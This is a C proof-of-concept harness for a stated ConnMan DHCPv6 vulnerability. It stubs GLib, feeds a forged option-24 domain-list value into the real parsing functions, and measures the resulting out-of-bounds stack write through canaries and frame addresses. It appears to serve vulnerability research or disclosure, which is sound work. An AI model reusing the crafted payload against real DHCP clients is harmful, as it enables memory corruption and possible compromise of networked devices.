/*
 * Caller-chain harness for CVE-2026-115863 / GHSA-725f-6r9j-c4hf.
 *
 * Three functions are included VERBATIM from pinned ConnMan tag 2.0
 * gdhcp/client.c via generated .inc files:
 *   get_domains_fn.inc   <- static GList *get_domains(int, unsigned char *)
 *   get_ov_list_fn.inc   <- static GList *get_dhcpv6_option_value_list(...)
 *   get_request_fn.inc   <- static void get_dhcpv6_request(...)
 *
 * This file supplies only NS_MAXDNAME, option-code constants, minimal GLib
 * stubs, a fake dhcpv6_get_option() returning a REPLY-shaped option-24 value,
 * and instrumentation in main()/debug(). No connman build, no DHCPv6 socket,
 * no daemon, no network.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#define NS_MAXDNAME 1025

/* ConnMan tag 2.0 gdhcp/common.h DHCPv6 option codes (values only the
 * exercised switch arms need; the crafted packet selects code 24 only). */
#define G_DHCPV6_IA_NA        3
#define G_DHCPV6_IA_TA        4
#define G_DHCPV6_DNS_SERVERS 23
#define G_DHCPV6_DOMAIN_LIST 24
#define G_DHCPV6_IA_PD       25
#define G_DHCPV6_SNTP_SERVERS 31

typedef int gboolean;
typedef int gint;
typedef unsigned int guint;
typedef void *gpointer;
typedef size_t gsize;

typedef struct GList {
	void *data;
	struct GList *next;
	struct GList *prev;
} GList;

typedef struct _GHashTable GHashTable;

static GList *g_list_prepend(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n));
	if (!n) exit(91);
	n->data = data;
	n->next = list;
	n->prev = NULL;
	if (list) list->prev = n;
	return n;
}

static GList *g_list_append(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n)), *p;
	if (!n) exit(93);
	n->data = data; n->next = NULL; n->prev = NULL;
	if (!list) return n;
	for (p = list; p->next; p = p->next) ;
	p->next = n; n->prev = p;
	return list;
}

static GList *g_list_reverse(GList *list)
{
	GList *prev = NULL, *cur = list;
	while (cur) {
		GList *next = cur->next;
		cur->next = prev;
		cur->prev = next;
		prev = cur;
		cur = next;
	}
	return prev;
}

static char *g_strdup(const char *s)
{
	size_t n = strlen(s) + 1;
	char *p = malloc(n);
	if (!p) exit(92);
	memcpy(p, s, n);
	return p;
}

static void *g_try_malloc0(gsize n) { return calloc(1, n); }
static void g_free(void *p) { free(p); }
#define GINT_TO_POINTER(i) ((void *)(intptr_t)(i))
#define GPOINTER_TO_INT(p) ((int)(intptr_t)(p))

static void g_hash_table_remove(GHashTable *h, gpointer k) { (void)h; (void)k; }
static void g_hash_table_insert(GHashTable *h, gpointer k, gpointer v)
{ (void)h; (void)k; (void)v; }

/* Minimal GDHCPClient: only fields referenced by the extracted functions. */
typedef struct _GDHCPClient {
	GList *request_list;
	GHashTable *code_value_hash;
} GDHCPClient;

struct dhcpv6_packet { unsigned char raw[8]; };

/* Capture get_dhcpv6_request()'s frame base from inside the real debug()
 * call site, without modifying any verbatim function. */
static void *g_request_rbp;
static void debug(GDHCPClient *client, const char *format, ...)
{
	(void)client; (void)format;
	if (!g_request_rbp) g_request_rbp = __builtin_frame_address(1);
}

/* get_addresses is not reached: the crafted packet offers only code 24. */
static GList *get_addresses(GDHCPClient *c, int code, int len,
				unsigned char *value, uint16_t *status)
{
	(void)c; (void)code; (void)len; (void)value; (void)status;
	return NULL;
}
/* Forward declaration: the verbatim get_dhcpv6_request() calls this before
 * the stub definition later in this file. */
static uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,
					uint16_t code, uint16_t *option_len,
					uint8_t *count);


#include "get_domains_fn.inc"
#include "get_ov_list_fn.inc"
#include "get_request_fn.inc"

#define MAXLEN 2048
static unsigned char option24[MAXLEN];

/* Stubbed dhcpv6_get_option(): a forged REPLY carrying one option-24 value.
 * option_len is uint16_t in the real API, so 2048 is representable. */
static uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,
					uint16_t code, uint16_t *option_len,
					uint8_t *count)
{
	(void)packet; (void)pkt_len;
	if (code != G_DHCPV6_DOMAIN_LIST) return NULL;
	if (count) *count = 1;
	*option_len = (uint16_t)MAXLEN;
	return option24;
}

static void craft(int lastjump)
{
	memset(option24, 0xff, sizeof(option24));
	option24[MAXLEN - 1] = 0x00;
	option24[1024] = (unsigned char)lastjump;
}

static void craft_safe(void)
{
	memset(option24, 0, sizeof(option24));
	option24[0] = 3; option24[1] = 'a'; option24[2] = 'b'; option24[3] = 'c';
	option24[4] = 3; option24[5] = 'd'; option24[6] = 'e'; option24[7] = 'f';
}

static void run_chain(GDHCPClient *client, struct dhcpv6_packet *pkt,
			uint16_t *status)
{
	get_dhcpv6_request(client, pkt, sizeof(*pkt), status);
}

#ifndef PLAIN
int main(int argc, char **argv)
{
	int attack = (argc < 2 || strcmp(argv[1], "attack") == 0);
	int lastjump = 0x20;
	if (argc >= 3) lastjump = (int)strtol(argv[2], NULL, 0);
	if (attack) craft(lastjump); else craft_safe();

	int usedlen = attack ? MAXLEN : 8;
	printf("CHAIN USEDLEN=%d LASTJUMP=%02x\n", usedlen, lastjump);
	fflush(stdout);

	GDHCPClient client;
	memset(&client, 0, sizeof(client));
	client.request_list = g_list_prepend(NULL, GINT_TO_POINTER(G_DHCPV6_DOMAIN_LIST));
	struct dhcpv6_packet pkt;
	memset(&pkt, 0, sizeof(pkt));
	uint16_t status = 0;
	run_chain(&client, &pkt, &status);

	printf("CHAIN DONE STATUS=%u REQ_RBP=%p OPTION24=%p\n",
	       status, g_request_rbp, (void *)option24);
	return 0;
}
#else
int main(int argc, char **argv)
{
	int lastjump = (argc >= 2) ? (int)strtol(argv[1], NULL, 0) : 0x80;
	craft(lastjump);
	printf("PLAIN LASTJUMP=%02x\n", lastjump);
	fflush(stdout);

	/* Broad caller-frame canary in main(). The natural chain is
	 * main -> get_dhcpv6_request -> get_dhcpv6_option_value_list ->
	 * get_domains; the OOB walk travels upward through all callee frames
	 * into this region. */
	volatile unsigned char fill[16384];
	for (int i = 0; i < (int)sizeof(fill); i++) fill[i] = 0xee;

	GDHCPClient client;
	memset(&client, 0, sizeof(client));
	client.request_list = g_list_prepend(NULL, GINT_TO_POINTER(G_DHCPV6_DOMAIN_LIST));
	struct dhcpv6_packet pkt;
	memset(&pkt, 0, sizeof(pkt));
	uint16_t status = 0;
	run_chain(&client, &pkt, &status);

	int dots = 0, first = -1, last = -1;
	for (int i = 0; i < (int)sizeof(fill); i++) {
		if (fill[i] == 0x2e) {
			dots++;
			if (first < 0) first = i;
			last = i;
		}
	}
	printf("CANARY DOTS=%d FIRST=%d LAST=%d FILLBASE=%p REQ_RBP=%p OPTION24=%p\n",
	       dots, first, last, (void *)(uintptr_t)fill, g_request_rbp,
	       (void *)option24);
	return 0;
}
#endif
